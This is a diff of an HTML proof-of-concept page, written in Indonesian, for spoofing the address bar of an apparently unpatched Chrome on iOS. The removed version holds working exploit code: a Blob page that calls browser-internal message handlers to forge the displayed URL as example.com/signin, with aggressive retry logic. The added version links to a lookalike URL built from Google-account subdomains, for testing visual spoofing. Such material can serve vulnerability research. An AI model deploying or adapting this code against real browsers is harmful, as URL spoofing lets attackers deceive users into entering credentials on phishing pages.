@@ -1,183 +1,66 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1, user-scalable=yes"
-    />
-    <title>CVE-2026-95291 Fully Reinforced PoC (Example.com Target)</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - iOS Location Bar RTL Spoofing Test</title>
     <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        background: #09090b;
-        color: #f4f4f5;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-      .container {
-        background: #18181b;
-        padding: 40px;
-        border-radius: 16px;
-        text-align: center;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        max-width: 480px;
-        width: 90%;
-        border: 1px solid #27272a;
-      }
-      button {
-        padding: 18px 32px;
-        font-size: 16px;
-        font-weight: bold;
-        background: #2563eb;
-        color: #fff;
-        border: none;
-        border-radius: 12px;
-        cursor: pointer;
-        transition: background 0.2s ease;
-      }
-      button:hover {
-        background: #1d4ed8;
-      }
-      .log-box {
-        margin-top: 20px;
-        padding: 12px;
-        background: #000;
-        border: 1px solid #3f3f46;
-        border-radius: 8px;
-        font-family: monospace;
-        font-size: 12px;
-        color: #38bdf8;
-        text-align: left;
-        max-height: 140px;
-        overflow-y: auto;
-      }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 { color: #d9534f; }
+        .spoof-box {
+            background: #ffe6e6;
+            border: 1px dashed #d9534f;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+            word-break: break-all;
+        }
+        a.btn {
+            display: inline-block;
+            background: #0275d8;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        a.btn:hover { background: #025aa5; }
     </style>
-  </head>
-  <body>
-    <div class="container">
-      <h2 style="margin-top:0; color:#60a5fa;">Reinforced Spoofing PoC</h2>
-      <p style="font-size:14px; color:#a1a1aa; margin-bottom:24px;">
-        Target: <code>example.com</code> dengan sistem <em>Aggressive Polling &amp; Fallback Bypass</em>.
-      </p>
-      <button id="runPoC">LUNCURKAN EKSPLOITASI FULL KUAT</button>
-      <div class="log-box" id="logOutput">Status: Menunggu eksekusi pengguna...</div>
+</head>
+<body>
+
+<div class="container">
+    <h2>⚠️ iOS Location Bar Spoofing PoC</h2>
+    <p>File uji ini mensimulasikan injeksi karakter RTL (*Right-to-Left*) dan subdomain berlapis untuk memicu pembalikan urutan visual komponen URL pada bar alamat browser yang rentan.</p>
+    
+    <div class="spoof-box">
+        <strong>Target Simulasi URL:</strong><br>
+        <code>https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/</code>
     </div>
 
-    <script>
-      function log(msg) {
-        const box = document.getElementById("logOutput");
-        box.innerText += "\n> " + msg;
-        box.scrollTop = box.scrollHeight;
-      }
+    <p><strong>Instruksi Pengujian:</strong></p>
+    <ol>
+        <li>Buka halaman ini menggunakan browser target (misal: Chrome iOS versi lama/belum di-patch).</li>
+        <li>Klik tombol di bawah ini untuk mengarahkan navigasi ke URL uji.</li>
+        <li>Amati bagian <em>Location Bar</em> (Apakah TLD bergeser ke kiri atau tetap di kanan sesuai aturan LTR).</li>
+    </ol>
 
-      // Payload dokumen penyerang di dalam Blob URL dengan target example.com
-      const maliciousBlobContent = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="utf-8">
-          <title>Example Domain Verification</title>
-        </head>
-        <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-          <div style="padding: 40px; max-width: 400px;">
-            <h1 style="font-size:28px;color:#1f2937;margin-bottom:10px;">Example Domain</h1>
-            <p style="font-size:16px;color:#4b5563;margin-bottom:20px;">Verifikasi keamanan transisi halaman.</p>
-            <div style="border: 1px solid #d1d5db; padding: 15px; border-radius: 8px; background: #f9fafb;">
-              <p style="font-size:12px;color:#ef4444;margin:0;font-weight:600;">[Simulasi Konten Terkendali Penyerang - Target: Example.com]</p>
-            </div>
-          </div>
-          <script>
-            (function() {
-              const writeLog = (m) => { try { console.log('[FULL-REINFORCED-BLOB] ' + m); } catch(e){} };
-              
-              const mh = (window.webkit && window.webkit.messageHandlers) || {};
-              if (!mh.NavigationEventMessage) {
-                writeLog('KESALAHAN: NavigationEventMessage handler tidak tersedia.');
-                return;
-              }
+    <!-- Tombol untuk memicu redirect ke URL PoC -->
+    <a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank">Jalankan Navigasi PoC</a>
+</div>
 
-              let dispatched = false;
-              const triggerSpoof = (attemptSource) => {
-                if (dispatched) return;
-                try {
-                  let fid = null;
-                  if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-                    fid = window.__gCrWeb.getFrameId();
-                  }
-
-                  if (!fid) {
-                    writeLog('Peringatan: frameId belum tersedia pada ' + attemptSource);
-                    return;
-                  }
-
-                  if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
-                    window.__gCrWeb.registerFrame();
-                  }
-
-                  // Mengirim sinyal sinkronisasi state secara berurutan
-                  mh.NavigationEventMessage.postMessage({
-                    command: 'willChangeState',
-                    frame_id: fid
-                  });
-
-                  // Mengganti target spoof URL ke example.com sesuai permintaan
-                  mh.NavigationEventMessage.postMessage({
-                    command: 'didReplaceState',
-                    frame_id: fid,
-                    stateObject: '',
-                    baseUrl: 'https://x/',
-                    pageUrl: 'blob:https://example.com/signin'
-                  });
-
-                  writeLog('Pesan spoofing berhasil dikirim ke example.com via ' + attemptSource);
-                  dispatched = true;
-                } catch(err) {
-                  writeLog('Gagal mengirim pesan (' + attemptSource + '): ' + err);
-                }
-              };
-
-              // 1. Aggressive Polling Interval Super Cepat (tiap 30ms)
-              let pollCount = 0;
-              const intervalId = setInterval(() => {
-                pollCount++;
-                triggerSpoof('polling interval #' + pollCount);
-                if (dispatched || pollCount > 40) {
-                  clearInterval(intervalId);
-                }
-              }, 30);
-
-              // 2. Fallback Timeout Berlapis untuk Mengatasi Variasi Waktu Load
-              setTimeout(() => triggerSpoof('timeout 100ms'), 100);
-              setTimeout(() => triggerSpoof('timeout 300ms'), 300);
-              setTimeout(() => triggerSpoof('timeout 700ms'), 700);
-              setTimeout(() => triggerSpoof('timeout 1500ms'), 1500);
-            })();
-          <\/script>
-        </body>
-        </html>
-      `;
-
-      document.getElementById("runPoC").onclick = function () {
-        log("Membuat objek Blob berkinerja tinggi...");
-        const blob = new Blob([maliciousBlobContent], { type: 'text/html' });
-        const blobUrl = URL.createObjectURL(blob);
-
-        log("Membuka tab target menggunakan navigasi langsung...");
-        
-        // Membuka jendela baru; jika diblokir pop-up, arahkan halaman saat ini secara otomatis
-        const targetTab = window.open(blobUrl, "_blank");
-        if (targetTab) {
-          log("Tab baru berhasil diinisialisasi.");
-        } else {
-          log("Peringatan: Pop-up diblokir, mengalihkan halaman saat ini ke Blob URL...");
-          window.location.href = blobUrl;
-        }
-      };
-    </script>
-  </body>
+</body>
 </html>
